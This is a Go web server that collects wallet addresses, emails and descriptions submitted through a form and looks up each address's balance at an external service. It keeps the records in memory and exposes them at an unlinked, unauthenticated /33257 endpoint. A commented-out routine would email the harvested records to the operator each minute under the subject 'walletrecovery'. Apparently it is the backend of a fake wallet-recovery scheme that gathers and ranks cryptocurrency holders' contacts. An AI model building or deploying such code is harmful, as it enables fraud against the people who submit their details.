package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
)

const HOU_URL = "http://black.mxz.so/wanke/query?address="
const POOR_BALANCE = 0

var RequestMap RequestStatic

type requestForm struct {
	Addr        string
	Email       string
	Description string
	Balance     int
}

type RequestStatic map[string]*requestForm

type BalanceInfo struct {
	Data struct {
		Balance int `json:"balance"`
	}
}

func (r *requestForm) String() string {
	return fmt.Sprintf("%+v", *r)
}

func (r *RequestStatic) String() string {
	resultStr := ""
	for _, v := range *r {
		resultStr += v.String()
		resultStr += "\n"
	}
	return resultStr
}

func GetInfoHandler(response http.ResponseWriter, request *http.Request) {
	data, err := json.Marshal(RequestMap)
	if err != nil {
		log.Println(err)
		return
	}
	response.Write([]byte(data))
}
func PostInfoHandler(response http.ResponseWriter, request *http.Request) {
	request.ParseForm()
	form := &requestForm{}
	form.Addr = request.FormValue("address")
	form.Email = request.FormValue("email")
	form.Description = request.FormValue("description")
	if form.Addr != "" {
		//query balance
		url := HOU_URL + form.Addr
		result := httpGet(url)
		balanceInfo := BalanceInfo{}
		err := json.Unmarshal(result, &balanceInfo)
		if err != nil {
			log.Println("unmarshal err ", err)
		}
		form.Balance = balanceInfo.Data.Balance
		//balance > poor
		if form.Balance >= POOR_BALANCE {
			RequestMap[form.Addr] = form
		}
		log.Printf("%+v", form)
	}
	ret, _ := ioutil.ReadFile("/Users/dongwei/Downloads/mycode/web_project/views/docs/success.html")
	response.Write(ret)
}
func httpGet(addr string) (result []byte) {
	resp, err := http.Get(addr)
	if resp != nil && resp.Body != nil {
		defer resp.Body.Close()
	}
	if err != nil {
		log.Println(err)
		return
	}
	result, err = ioutil.ReadAll(resp.Body)
	return result
}

/*
func crontabMail() {
	mail.SendEmailSSL(mail.TO, "walletrecovery", "fffffffffffffffff")
	ticker := time.NewTicker(time.Minute)
	for {
		<-ticker.C
		mail.SendEmailSSL(mail.TO, "walletrecovery", RequestMap.String())
		log.Println(RequestMap.String())
	}
}
*/
func main() {
	RequestMap = make(map[string]*requestForm)
	http.Handle("/", http.FileServer(http.Dir("/Users/dongwei/Downloads/mycode/web_project/views/docs/")))
	http.HandleFunc("/postInfo", PostInfoHandler)
	http.HandleFunc("/33257", GetInfoHandler)
	http.ListenAndServe(":6799", nil)
}
